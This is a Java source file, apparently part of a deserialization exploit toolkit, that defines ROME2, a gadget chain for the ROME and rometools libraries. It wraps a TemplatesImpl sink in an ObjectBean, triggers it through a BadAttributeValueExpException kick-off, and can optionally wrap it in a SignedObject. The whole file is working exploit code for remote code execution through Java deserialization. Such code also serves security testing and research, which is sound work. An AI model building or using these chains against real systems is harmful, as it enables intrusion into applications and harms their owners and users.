package com.ppp.chain.rome;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.Printer;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.chain.WrapSerialization;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.GadgetDependency;
import com.ppp.sinks.annotation.Sink;
import com.sun.syndication.feed.impl.ObjectBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.security.SignedObject;

/**
 * @author Whoopsunix
 */
@Dependencies({"rome:rome:1.0"})
@Authors({Authors.Firebasky})
@Sink({Sink.TemplatesImpl})
public class ROME2 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(ROME2.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(Templates.class, sinkObject, sinksHelper.getGadgetDependency());

        // wrap
        if (sinksHelper.getWrapSerialization() != null) {
            Object signedObject = WrapSerialization.scheduler(kickOffObject, sinksHelper);
            kickOffObject = getChain(SignedObject.class, signedObject, sinksHelper.getGadgetDependency());
        }

        return kickOffObject;
    }

    public Object getChain(Class cls, Object object, GadgetDependency dependency) throws Exception {
        if (dependency.equals(GadgetDependency.RomeTools)) {
            return rometools(cls, object);
        } else {
            return rome(cls, object);
        }
    }

    public Object rome(Class cls, Object object) throws Exception {
        Printer.yellowInfo("Using rome");
        ObjectBean delegate = new ObjectBean(cls, object);

        BadAttributeValueExpException badAttributeValueExpException = KickOff.badAttributeValueExpException(delegate);

        return badAttributeValueExpException;
    }

    public Object rometools(Class cls, Object object) throws Exception {
        Printer.yellowInfo("Using romeTools");
        com.rometools.rome.feed.impl.ObjectBean delegate = new com.rometools.rome.feed.impl.ObjectBean(cls, object);

        BadAttributeValueExpException badAttributeValueExpException = KickOff.badAttributeValueExpException(delegate);

        return badAttributeValueExpException;
    }
}
